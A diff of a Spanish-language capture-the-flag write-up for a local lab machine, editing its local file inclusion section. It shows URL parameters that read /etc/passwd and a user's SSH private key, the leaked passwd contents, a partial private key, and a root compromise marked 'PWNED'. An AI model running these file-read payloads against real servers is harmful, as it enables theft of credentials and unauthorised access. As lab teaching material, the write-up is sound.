@@ -58,24 +58,30 @@ Al parecer es una pagina donde me clavaron un virus.......
 
 Al darle al boton de ejemplos de computadoras infectadas nos lleva a esta otra vista
 
-- Podemos notar que el parametro `images` es quien esta listando el archivo `ejemplo1.png`
-
 ```
 > http://172.17.0.2/ejemplos.php?images=./ejemplo1.png
 ```
 
 ![](assets/Pasted%20image%2020251105002745.png)
 
-- Podemos notar que el parametro `images` cuyo valor es la ruta del archivo `ejemplo1.png` es quien esta tratando de listar el archivo.
-## Explotación
+- Podemos notar en la URL que el parametro `images` cuyo valor es la ruta del archivo `ejemplo1.png` es quien esta tratando de listar el archivo.
 
-Sabiendo que la web esta tratando de listar un archivo, lo que hice fue tratar de apuntar al archivo */etc/passwd* para ver si la web lo listaba correctamente.
+## Explotación LFI
+
+!!! info
+
+    LFI (Local File Inclusion) es una vulnerabilidad web que permite a un atacante leer o incluir archivos locales del servidor manipulando parámetros que no están correctamente validados, como rutas de archivos.
+    Puede exponer información sensible del sistema y, en ciertos casos, derivar en ejecución de código.
+
+Al identificar que la aplicación web intentaba listar un archivo mediante un parametro, probé manipular la ruta para apuntar a /etc/passwd y verificar si el contenido era mostrado correctamente por la aplicación.
 
 ```
-> ejemplos.php?images=/etc/passwd
+> http://172.17.0.2/ejemplos.php?images=/etc/passwd
 ```
 
-La web listo correctamente el archivo 
+La web si me lista el contenido y obtengo lo siguiente del `/etc/passwd`:
+
+- Podemos dar Ctrl + U en la web para ver el codigo fuente y ver de mejor manera la respuesta. 
 
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -109,20 +115,20 @@ nico:x:1000:1000:,,,:/home/nico:/bin/bash --------------------------------------
 nico:x:1000:1000:,,,:/home/nico:/bin/bash_
 ```
 
-
-Sabiendo que el servicios `SSH` esta abierto, es posible que el usuario nico tenga alguna clave privada. Por lo cual aprovechándome del LFI puedo tratar de apuntar a dicha clave.
+Sabiendo que el servicio `SSH` esta abierto, es posible que el usuario nico tenga alguna clave privada. Por lo cual aprovechándome del LFI puedo tratar de apuntar a dicha clave.
 
 ```
-> ejemplos.php?images=/home/nico/.ssh/id_rsa
+> http://172.17.0.2/ejemplos.php?images=/home/nico/.ssh/id_rsa
 ```
 
-La web efectivamente list la clave ssh del usuario nico.
+La web efectivamente lista la clave ssh del usuario nico.
 
 ```
        -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEA07BRWc6X8Yz+VwO1l5UAqcFE5K+1yQ9QxFBrt8DzyC9x7o0tluCk
 4f4gObHgatf/tXX/z8oGKYnAY48/vctJz//3M9phYgcFhoDOs+F3NgyYZ7oZN/TeEgTlql
+<MAS...>
 ```
 
 Procedí a guardar la clave en mi sistema y a darle permisos.
@@ -168,4 +174,4 @@ root
 ```
 
 
-***PWNED**
+***PWNED***
